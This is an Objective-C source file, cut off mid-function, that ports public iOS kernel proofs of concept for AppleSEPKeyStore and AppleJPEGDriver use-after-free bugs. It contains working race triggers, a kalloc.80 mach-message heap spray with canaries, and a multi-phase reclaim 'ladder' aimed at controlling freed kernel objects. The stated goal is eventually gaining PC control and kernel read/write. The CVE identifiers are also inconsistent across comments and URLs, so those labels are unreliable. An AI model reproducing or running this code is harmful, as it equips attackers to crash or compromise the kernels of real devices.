// ---------------------------------------------------------------------------
// NewProbes.m - two measurement probes for the only root-class applicable CVE
// and the only A14-tested public kernel PoC:
//
//  ModIOGPUUAFOracle  (CVE-2026-64788, PoC: ByteV0rtex, TESTED ON A14)
//    IOGPUDevice::create_resource_iosurface leaves a stale resource-table
//    entry when a packed dimension overflow (1x65535) takes the error path.
//    The PoC's oracle: set_resource_purgeable on the stale id returns
//    0xe00002be (stale entry processed) instead of 0xe00002c2 (not found).
//    This module: (1) drives the overflow path with IOSurfaces + Metal
//    textures, (2) finds the accelerator user client, (3) sweeps its
//    selectors and logs every return code - the measurement itself.  It does
//    NOT write anything and does NOT chain anything.
//
//  ModVmMapWrap  (CVE-2025-46285, the only root-class CVE)
//    xnu-12377.60.50 keeps struct vm_map.timestamp as a 32-bit version
//    counter (fixed to uint64_t in 26.2).  Every entry insert/remove in one
//    map increments it; a wrap lets a saved version collide with a re-read
//    version (TOCTOU).  This module measures the increment rate on THIS
//    device and projects the time to 2^32 on a single map - the precondition.
//    It churns one map (mmap/munmap pairs in the same range), logs the rate,
//    and is resumable across launches via the forensic file.
// ---------------------------------------------------------------------------
// Apple's <aio.h> and <sys/event.h> hide struct aiocb / struct kevent64_s
// behind __DARWIN_C_LEVEL guards; opening them here is what makes the AIO
// kevent UAF module compile.
#define _DARWIN_C_SOURCE 1
#import <aio.h>
#import <sys/event.h>
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <malloc/malloc.h>
#import <sys/mman.h>
#import <unistd.h>
#import <stdio.h>
#import <time.h>
#import <errno.h>
#import <string.h>
#import <pthread.h>
#import <sys/sysctl.h>
#import <objc/runtime.h>

#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// Metal is linked in build.sh, but the SDK's Metal umbrella does not expose
// its types to this translation unit (measured on the CI toolchain: MTLDevice
// undeclared despite -framework Metal, and a hand-declared @protocol did not
// satisfy the compiler either).  So: plain id + the REAL selector names
// declared on NSObject (a category), and the class fetched at runtime.  The
// signatures match the runtime (note the lowercase "iosurface:", exactly as
// the CI compiler suggested).
extern id MTLCreateSystemDefaultDevice(void);

@interface NSObject (RSMetalNames)
+ (instancetype)texture2DDescriptorWithPixelFormat:(NSUInteger)pixelFormat
                                            width:(NSUInteger)width
                                           height:(NSUInteger)height
                                        mipmapped:(BOOL)mipmapped;
- (id)newTextureWithDescriptor:(id)descriptor
                     iosurface:(struct __IOSurface *)iosurface
                         plane:(NSUInteger)plane;
- (void)setUsage:(NSUInteger)usage;
@end

#define RS_MTL_PIXEL_BGRA8UNORM 80
#define RS_MTL_USAGE_SHADERREAD 1

// IOSurface: not importable from the plain iOS SDK
typedef struct __IOSurface *IOSurfaceRef_;
extern IOSurfaceRef_ IOSurfaceCreate(CFDictionaryRef dictionary);
extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef_ buffer);
extern int IOSurfaceLock(IOSurfaceRef_, uint32_t, uint32_t *);
extern int IOSurfaceUnlock(IOSurfaceRef_, uint32_t, uint32_t *);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
#define kIOSurfaceWidth  CFSTR("IOSurfaceWidth")
#define kIOSurfaceHeight CFSTR("IOSurfaceHeight")
#define kIOSurfaceBytesPerElement CFSTR("IOSurfaceBytesPerElement")
#define kIOSurfaceBytesPerRow CFSTR("IOSurfaceBytesPerRow")
#define kIOSurfacePixelFormat CFSTR("IOSurfacePixelFormat")

static volatile io_connect_t g_aks_conn = 0;
static volatile int g_aks_done = 0;
static volatile int g_aks_calls = 0;
static volatile int g_aks_closes = 0;
static volatile int g_aks_opens = 0;

// ===========================================================================
// 6. CVE-2026-20637 + RECLAIM: the confirmed UAF, now with a kalloc.80 spray
//    The 25.11 device panic PROVED the UAF: "[iokit.IOCommandGate]: element
//    modified after free (off:72, val:0xffffffffffffff00, sz:80, ...)" - the
//    kernel reads and writes a FREED 80-byte gate element.  sz=80 means the
//    element lives in kalloc.80, so a tight send/receive loop of 80-byte mach
//    messages filled with our canary churns that zone with our data: if the
//    panic value ever shows 0xC0FFEE5A... instead of 0xffffffffffffff00, the
//    freed element was reclaimed by our spray = a controlled gate element.
// ===========================================================================
static volatile int g_spray_run = 0;
static volatile int g_spray_n = 0;
static mach_port_t g_spray_port = MACH_PORT_NULL;

static void *rs_spray80(void *arg) {
    (void)arg;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_TYPE_RECEIVE, &g_spray_port) != KERN_SUCCESS)
        return NULL;
    mach_port_insert_right(mach_task_self(), g_spray_port, g_spray_port, MACH_MSG_TYPE_MAKE_SEND);
    while (g_spray_run) {
        // exactly 80 bytes: 24-byte header + 56-byte canary body -> kalloc.80
        struct { mach_msg_header_t h; unsigned char body[56]; } m;
        memset(&m, 0, sizeof m);
        m.h.msgh_size = sizeof m;
        m.h.msgh_local_port = g_spray_port;
        for (int k = 0; k < 56; k += 8) {
            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
            memcpy(m.body + k, &v, 8);
        }
        // send to ourselves and immediately receive: the kernel allocates
        // 80 bytes, copies our canary in, then frees it - a tight zone churn
        kern_return_t kr = mach_msg(&m.h, MACH_SEND_MSG | MACH_RCV_MSG,
                                    m.h.msgh_size, m.h.msgh_size, g_spray_port,
                                    MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&g_spray_n, 1);
        else break;
    }
    return NULL;
}

NSString *ModAksReclaim(void) {
    AveLog(@"[aks-reclaim] === 20637 UAF + kalloc.80 canary reclaim ===");
    g_aks_conn = 0; g_aks_done = 0; g_aks_calls = 0; g_aks_closes = 0; g_aks_opens = 0;
    g_spray_run = 0; g_spray_n = 0;

    CFMutableDictionaryRef m = IOServiceMatching("AppleKeyStore");
    if (!m) return @"AppleKeyStore: no matching dictionary";
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
        return @"AppleKeyStore: service not found";
    io_service_t svc = IOIteratorNext(it);
    IOObjectRelease(it);
    if (!svc) return @"AppleKeyStore: no service instance";

    // the reclaim spray: 80-byte canary messages churning kalloc.80
    g_spray_run = 1;
    pthread_t sp;
    if (pthread_create(&sp, NULL, rs_spray80, NULL) == 0)
        AveLog(@"[aks-reclaim] spray thread up (80-byte canary messages)");
    else
        AveLog(@"[aks-reclaim] spray thread FAILED to start");

    // 8 callers + 4 closers (the confirmed race)
    for (int t = 0; t < 8; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                for (uint32_t sel = 0; sel < 16; sel++) {
                    uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
                    IOConnectCallMethod(c, sel, sc, 6, NULL, 0, NULL, NULL, NULL, NULL);
                    __sync_fetch_and_add(&g_aks_calls, 1);
                }
            }
        });
    }
    for (int t = 0; t < 4; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                IOServiceClose(c);
                __sync_fetch_and_add(&g_aks_closes, 1);
                g_aks_conn = 0;
            }
        });
    }
    // main: the open churn that keeps the race window hot
    const uint32_t types[4] = {0x2022, 0xbeef, 0x1337, 0x4141};
    const int N = 60000;
    for (int i = 0; i < N; i++) {
        io_connect_t conn = 0;
        if (IOServiceOpen(svc, mach_task_self(), types[i % 4], &conn) == KERN_SUCCESS && conn) {
            g_aks_conn = conn;
            __sync_fetch_and_add(&g_aks_opens, 1);
        }
        if ((i & 0x3FFF) == 0x3FFF)
            AveLog(S(@"[aks-reclaim] %d/%d opens (calls=%d closes=%d spray=%d)",
                     i, N, g_aks_calls, g_aks_closes, g_spray_n));
    }
    g_aks_done = 1; g_spray_run = 0;
    usleep(200000);
    if (g_aks_conn) { IOServiceClose(g_aks_conn); g_aks_conn = 0; }
    IOObjectRelease(svc);
    AveLog(S(@"[aks-reclaim] done: opens=%d calls=%d closes=%d spray=%d",
             g_aks_opens, g_aks_calls, g_aks_closes, g_spray_n));
    AveLog(@"[aks-reclaim] a panic showing 0xC0FFEE5A... = the freed gate element is OURS");
    AveSetStatus(@"reclaim run done - see the log");
    return S(@"reclaim: %d opens, %d spray messages; a panic with our canary = controlled element",
              g_aks_opens, g_spray_n);
}
//    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
//    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
//    fixed in 26.3.  Apple: "An app may be able to cause unexpected system
//    termination" (use after free).  The PoC immediately kernel-panics
//    affected devices.
//    Shape: 8 caller threads hammer IOConnectCallMethod on selectors 0-15
//    while 4 closer threads race IOServiceClose; the main thread opens 100k
//    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
//    delay, keeping the close/call race window hot.  The panic is
//    "[iokit.IOCommandGate]: element modified after free" (a freed 80-byte
//    gate element at offset 72).
// ===========================================================================
// ===========================================================================
// 5. CVE-2026-20637 port: AppleSEPKeyStore IOCommandGate UAF
//    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
//    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
//    fixed in 26.3.  CONFIRMED ON DEVICE 25.11: "[iokit.IOCommandGate]:
//    element modified after free (off:72, val:0xffffffffffffff00, sz:80)".
//    Shape: 8 caller threads hammer IOConnectCallMethod on selectors 0-15
//    while 4 closer threads race IOServiceClose; the main thread opens 100k
//    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
//    delay, keeping the close/call race window hot.
// ===========================================================================

NSString *ModAksUAF(void) {
    AveLog(@"[aks20637] === CVE-2026-20637: AppleSEPKeyStore IOCommandGate UAF (public PoC, TESTED on 26.1-26.2) ===");
    g_aks_conn = 0; g_aks_done = 0; g_aks_calls = 0; g_aks_closes = 0; g_aks_opens = 0;

    CFMutableDictionaryRef m = IOServiceMatching("AppleKeyStore");
    if (!m) return @"AppleKeyStore: no matching dictionary";
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
        return @"AppleKeyStore: service not found";
    io_service_t svc = IOIteratorNext(it);
    IOObjectRelease(it);
    if (!svc) return @"AppleKeyStore: no service instance";

    // 8 caller threads: hammer selectors 0-15 on the live connection
    for (int t = 0; t < 8; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                for (uint32_t sel = 0; sel < 16; sel++) {
                    uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
                    IOConnectCallMethod(c, sel, sc, 6, NULL, 0, NULL, NULL, NULL, NULL);
                    __sync_fetch_and_add(&g_aks_calls, 1);
                }
            }
        });
    }
    // 4 closer threads: race IOServiceClose
    for (int t = 0; t < 4; t++) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            while (!g_aks_done) {
                io_connect_t c = g_aks_conn;
                if (!c) continue;
                IOServiceClose(c);
                __sync_fetch_and_add(&g_aks_closes, 1);
                g_aks_conn = 0;
            }
        });
    }
    // main: 100k connections, rotating types, no delay (the hot race window)
    const uint32_t types[4] = {0x2022, 0xbeef, 0x1337, 0x4141};
    const int N = 100000;
    for (int i = 0; i < N; i++) {
        io_connect_t conn = 0;
        if (IOServiceOpen(svc, mach_task_self(), types[i % 4], &conn) == KERN_SUCCESS && conn) {
            g_aks_conn = conn;
            __sync_fetch_and_add(&g_aks_opens, 1);
        }
        if ((i & 0x3FFF) == 0x3FFF)
            AveLog(S(@"[aks20637] %d/%d opens (calls=%d closes=%d)", i, N, g_aks_calls, g_aks_closes));
    }
    g_aks_done = 1;
    usleep(200000);
    if (g_aks_conn) { IOServiceClose(g_aks_conn); g_aks_conn = 0; }
    IOObjectRelease(svc);
    AveLog(S(@"[aks20637] done: opens=%d calls=%d closes=%d (a panic = the IOCommandGate UAF fired)",
             g_aks_opens, g_aks_calls, g_aks_closes));
    AveSetStatus(@"20637 trigger done - see the log");
    return S(@"20637: %d opens, %d calls, %d closes; a panic = the IOCommandGate UAF fired",
              g_aks_opens, g_aks_calls, g_aks_closes);
}
//    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
//    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
//    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
//    to cause unexpected system termination or WRITE KERNEL MEMORY".
//
//    Shape (from the PoC's disassembly notes):
//      selector 1 = decode, structIn = structOut = 0x58 (AppleJPEGDriverIOStruct)
//      asyncToken != 0  => async mode => the request node (req+0x78) is pushed
//      into the per-codec vector at driver self+192; closing the client with
//      requests in flight frees the JpegRequest (0x440 bytes) WITHOUT
//      dequeuing; a later queue walk (finish_io_gated -> fullSpeedRequestExist)
//      reads the stale node: req2 = *(node+8) -> UAF.  req+0x00 is a task_t,
//      so a vtable-style deref of it is PC control.
//    This module drives exactly that shape (8 threads x iters x 10 async
//    requests, close under flight) and reports the wired-memory delta and
//    every return code.  The deferred panic usually needs one sync decode
//    afterwards (the PoC uses the Camera app).
// ===========================================================================
// ===========================================================================
// 4. CVE-2026-20687 port: AppleJPEGDriver startDecoder() timeout UAF
//    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
//    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
//    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
//    to cause unexpected system termination or WRITE KERNEL MEMORY".
//    Shape: selector 1 = decode, structIn = structOut = 0x58; asyncToken != 0
//    pushes the request node (req+0x78) into the per-codec vector; closing
//    the client with requests in flight frees the JpegRequest (0x440 bytes)
//    WITHOUT dequeuing; a later queue walk reads the stale node (req+0x80)
//    -> UAF.  req+0x00 is a task_t, so a vtable-style deref is PC control.
// ===========================================================================
typedef struct __attribute__((packed)) {
    uint32_t sourceID;      // +0x00 source IOSurface id (JPEG bytes)
    uint32_t field_04;      // +0x04 input size
    uint32_t destID;        // +0x08 dest IOSurface id
    uint32_t field_0C;      // +0x0C output size
    uint32_t field_10;      // +0x10
    uint32_t width;         // +0x14
    uint32_t height;        // +0x18
    uint32_t field_1C;      // +0x1C
    uint8_t  flags;         // +0x20 bit0=progressive
    uint8_t  pad_21[3];
    uint32_t xOffset;       // +0x24
    uint32_t yOffset;       // +0x28
    uint32_t subsampling;   // +0x2C
    uint64_t asyncToken;    // +0x30 non-zero = ASYNC (the UAF window)
    uint64_t asyncToken2;   // +0x38
    uint64_t field_40;      // +0x40
    uint32_t codecID;       // +0x48
    uint32_t outWidth;      // +0x4C
    uint32_t outHeight;     // +0x50
    uint32_t field_54;      // +0x54
} RSJpegIn;

static io_service_t rs_jpeg_service(void) {
    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
    if (!m) return 0;
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it) return 0;
    io_service_t s = IOIteratorNext(it);
    IOObjectRelease(it);
    return s;
}

static int64_t rs_wired_pages(void) {
    host_name_port_t host = mach_host_self();
    vm_statistics64_data_t vm;
    mach_msg_type_number_t n = HOST_VM_INFO64_COUNT;
    if (host_statistics64(host, HOST_VM_INFO64, (host_info64_t)&vm, &n) != KERN_SUCCESS) return -1;
    return (int64_t)vm.wire_count;
}

NSString *ModJpegUAF(void) {
    AveLog(@"[jpeg20687] === CVE-2026-20687: AppleJPEGDriver startDecoder timeout UAF (public PoC port) ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    // a real JPEG (the driver wants plausible input)
    const int W = 1024, H = 1024;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }

    // source surface: raw bytes, page-aligned
    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOObjectRelease(svc);
        return @"surface creation failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    AveLog(S(@"[jpeg20687] src=%u dst=%u jpeg=%zuB %dx%d", srcID, dstID, jpeg.length, W, H));

    int64_t wired0 = rs_wired_pages();
    AveLog(S(@"[jpeg20687] wired before: %lld pages", wired0));

    // 8 threads x iters x 10 async requests, close under flight
    const int THREADS = 8, REQS = 10, ITERS = 40;
    __block volatile int32_t totalSubmitted = 0, totalConn = 0;
    __block kern_return_t lastKR = 0;
    dispatch_group_t group = dispatch_group_create();
    for (int t = 0; t < THREADS; t++) {
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < ITERS; i++) {
                io_connect_t conn = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS || !conn) continue;
                int submitted = 0;
                for (int j = 0; j < REQS; j++) {
                    RSJpegIn in; memset(&in, 0, sizeof in);
                    in.sourceID = srcID; in.destID = dstID;
                    in.field_04 = (uint32_t)jpeg.length; in.field_0C = W * H * 4;
                    in.width = W; in.height = H; in.outWidth = W; in.outHeight = H;
                    in.subsampling = 3;
                    in.asyncToken = 0x4141 + j;      // non-zero = async mode
                    RSJpegIn out; memset(&out, 0, sizeof out);
                    size_t outSz = sizeof out;
                    kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in,
                                                                &out, &outSz);
                    lastKR = kr;
                    if (kr != KERN_SUCCESS) break;
                    submitted++;
                }
                IOServiceClose(conn);                // close with requests in flight
                __sync_fetch_and_add(&totalSubmitted, submitted);
                __sync_fetch_and_add(&totalConn, 1);
            }
        });
    }
    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
    usleep(500000);

    int64_t wired1 = rs_wired_pages();
    AveLog(S(@"[jpeg20687] connections=%d submitted=%d lastKR=%#x", totalConn, totalSubmitted, lastKR));
    AveLog(S(@"[jpeg20687] wired delta: %+lld pages (the JpegRequest leak)", wired1 - wired0));
    AveLog(@"[jpeg20687] deferred panic: run one SYNC decode now (open Camera or decode a JPEG)");

    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
    AveSetStatus(@"20687 trigger done - see the log");
    return S(@"20687: %d conns, %d async decodes, wired %+lld pages; a sync decode next = the deferred panic",
              totalConn, totalSubmitted, wired1 - wired0);
}

// ===========================================================================
// 4b. CVE-2026-20687 - the hidgate-poc "jpegclose7" control ladder, ported
//     Source: github.com/hidra0x/hidgate-poc experiments/applejpeg/jpegclose7.m
//     + docs/kernel-control.md.  Their measured ladder on A12 / iOS 18.7.2:
//       L0 crash PASS, L1 deferred JpegRequest UAF PASS,
//       L2 CONTROLLED 10s free PASS (sync decode returns kIOReturnTimeout
//         0xe00002d6 after 10.001s - the driver's 10s wait expiring),
//       L3 same-type reclaim PASS (10 async on the same connection right
//         after the timeout reuse the just-freed slot),
//       L4 persistent stale node PASS (far=0x308, reproduced WITHOUT Camera
//         by closing the userclient while a sync decode is in flight),
//       L5 write/read primitive NOT YET (their paired reclaim still misses
//         the slot: x12=0).
//     We port the exact sequence so the same levels can be measured on OUR
//     A14 / 26.2b1 (23C5027f).  kIOReturnTimeout = 0xe00002d6.
//     Sequence: prime -> mass spray (stalls the codec) -> early reclaim storm
//     (connections kept OPEN, codecID = t&3) -> victim: sync decode + close
//     DURING the sync -> second reclaim storm -> probe cycles -> free one
//     reclaimer at a time and probe after each.
// ===========================================================================
#define RS_JC_MAXRECLAIM 32
static io_connect_t rs_jc_reclaim[RS_JC_MAXRECLAIM];
static volatile int32_t rs_jc_rcount = 0;

// one decode submission; setCodec!=0 also writes request+0x48 (the codec id)
static int rs_jc_submit(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                        uint32_t w, uint32_t h, int count, uint64_t tokenBase,
                        uint8_t flags, uint32_t codecID, int setCodec) {
    int submitted = 0;
    for (int j = 0; j < count; j++) {
        RSJpegIn in;
        RSJpegIn out;
        memset(&in, 0, sizeof in);
        memset(&out, 0, sizeof out);
        in.sourceID = srcID;
        in.destID = dstID;
        in.field_04 = w * h;
        in.field_0C = w * h * 4;
        in.width = w;
        in.height = h;
        in.outWidth = w;
        in.outHeight = h;
        in.subsampling = 3;
        in.flags = flags;
        in.asyncToken = tokenBase + (uint64_t)j;
        if (setCodec) in.codecID = codecID;
        size_t outSz = sizeof out;
        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in, &out, &outSz);
        if (kr != KERN_SUCCESS) break;
        submitted++;
    }
    return submitted;
}

// one SYNCHRONOUS decode (asyncToken = 0, flags = 0) - the only call shape
// that can reach the driver's 10s wait and return kIOReturnTimeout
static kern_return_t rs_jc_sync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                uint32_t w, uint32_t h, CFTimeInterval *dt) {
    RSJpegIn in;
    RSJpegIn out;
    memset(&in, 0, sizeof in);
    memset(&out, 0, sizeof out);
    in.sourceID = srcID;
    in.destID = dstID;
    in.field_04 = w * h;
    in.field_0C = w * h * 4;
    in.width = w;
    in.height = h;
    in.outWidth = w;
    in.outHeight = h;
    in.subsampling = 3;
    in.flags = 0;
    in.asyncToken = 0;
    size_t outSz = sizeof out;
    CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
    kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in, &out, &outSz);
    if (dt) *dt = CFAbsoluteTimeGetCurrent() - t0;
    return kr;
}

NSString *ModJpegClose(void) {
    AveLog(@"[jpegclose] === CVE-2026-20687 ladder (hidgate-poc jpegclose7 port): prime -> mass spray -> early reclaim -> victim sync+close -> reclaim storm -> probe ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    // 2048x2048 (their size: big enough that the codec actually queues work)
    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    [[UIColor blueColor] setFill];
    UIRectFill(CGRectMake(0, 0, W / 2, H / 2));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }

    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOObjectRelease(svc);
        return @"surface creation failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    AveLog(S(@"[jpegclose] src=%u dst=%u jpeg=%zuB %ux%u", srcID, dstID, jpeg.length, W, H));

    memset(rs_jc_reclaim, 0, sizeof rs_jc_reclaim);
    rs_jc_rcount = 0;

    // ---- Phase 1: small prime (leaks the client state) ----
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    AveLog(S(@"[jpegclose] prime open kr=%#x", kr));
    if (kr == KERN_SUCCESS && conn) {
        int n = rs_jc_submit(conn, srcID, dstID, W, H, 5, 0x11110000, 0, 0, 0);
        AveLog(S(@"[jpegclose] prime submitted=%d", n));
        IOServiceClose(conn);
    }
    usleep(300000);

    // ---- Phase 2: mass spray - stalls the codec so the next sync decode
    //      actually reaches its 10s wait ----
    const int STHREADS = 8, SITERS = 100, SREQS = 10;
    __block int32_t sConn = 0, sReq = 0, sFail = 0;
    AveLog(S(@"[jpegclose] mass spray start %dx%dx%d", STHREADS, SITERS, SREQS));
    dispatch_group_t sgroup = dispatch_group_create();
    for (int t = 0; t < STHREADS; t++) {
        dispatch_group_async(sgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < SITERS; i++) {
                io_connect_t mc = 0;
                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &mc);
                if (opr != KERN_SUCCESS || !mc) { __sync_fetch_and_add(&sFail, 1); continue; }
                int n = rs_jc_submit(mc, srcID, dstID, W, H, SREQS,
                                     0x31310000 + (t << 8) + i, 0, 0, 0);
                if (n < SREQS) __sync_fetch_and_add(&sFail, 1);
                IOServiceClose(mc);
                __sync_fetch_and_add(&sReq, n);
                __sync_fetch_and_add(&sConn, 1);
            }
        });
    }
    dispatch_group_wait(sgroup, dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));
    AveLog(S(@"[jpegclose] mass spray done conn=%d req=%d fail=%d", sConn, sReq, sFail));
    usleep(1000000);

    // ---- Phase 3: early reclaim storm - connections stay OPEN, requests in
    //      flight, one codec each (codecID = t & 3) ----
    const int ETHREADS = 8, EREQS = 5;
    AveLog(S(@"[jpegclose] early reclaim start threads=%d reqs=%d", ETHREADS, EREQS));
    dispatch_group_t eg = dispatch_group_create();
    for (int t = 0; t < ETHREADS; t++) {
        dispatch_group_async(eg, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            io_connect_t c = 0;
            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
            if (opr != KERN_SUCCESS || !c) {
                AveLog(S(@"[jpegclose] early reclaim[%d] open kr=%#x", t, opr));
                return;
            }
            int n = rs_jc_submit(c, srcID, dstID, W, H, EREQS,
                                 0x51510000 + (t << 8), 0, (uint32_t)(t & 3), 1);
            int idx = __sync_fetch_and_add(&rs_jc_rcount, 1);
            if (idx < RS_JC_MAXRECLAIM) rs_jc_reclaim[idx] = c;
            AveLog(S(@"[jpegclose] early reclaim[%d] submitted=%d", t, n));
        });
    }
    dispatch_group_wait(eg, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    AveLog(S(@"[jpegclose] early reclaim done conns=%d", rs_jc_rcount));
    usleep(100000);

    // ---- Phase 4: THE TRIGGER - sync decode on a victim connection, and
    //      close that connection while the sync is still in flight.
    //      terminatePhase1 marks the client inactive early, so the timeout
    //      free skips the dequeue and leaves the embedded queue node in the
    //      per-codec vector: a persistent stale node, NO Camera needed. ----
    io_connect_t victim = 0;
    kern_return_t vor = IOServiceOpen(svc, mach_task_self(), 0, &victim);
    AveLog(S(@"[jpegclose] victim open kr=%#x", vor));
    if (vor == KERN_SUCCESS && victim) {
        __block kern_return_t syncKr = 0xdead;
        __block CFTimeInterval syncDt = 0;
        dispatch_group_t vgroup = dispatch_group_create();
        dispatch_group_async(vgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            CFTimeInterval dt = 0;
            syncKr = rs_jc_sync(victim, srcID, dstID, W, H, &dt);
            syncDt = dt;
            AveLog(S(@"[jpegclose] victim sync kr=%#x dt=%.3fs", syncKr, syncDt));
        });
        usleep(100000);   // the sync is now in flight
        dispatch_group_async(vgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            kern_return_t cr = IOServiceClose(victim);
            AveLog(S(@"[jpegclose] victim close DURING sync kr=%#x", cr));
        });
        dispatch_group_wait(vgroup, dispatch_time(DISPATCH_TIME_NOW, 20 * NSEC_PER_SEC));
        AveLog(S(@"[jpegclose] close-during-sync done kr=%#x dt=%.3fs", syncKr, syncDt));
        if (syncKr == (kern_return_t)0xe00002d6)
            AveLog(@"[jpegclose] *** CONTROLLED 10s FREE CONFIRMED (kIOReturnTimeout) ***");
        else
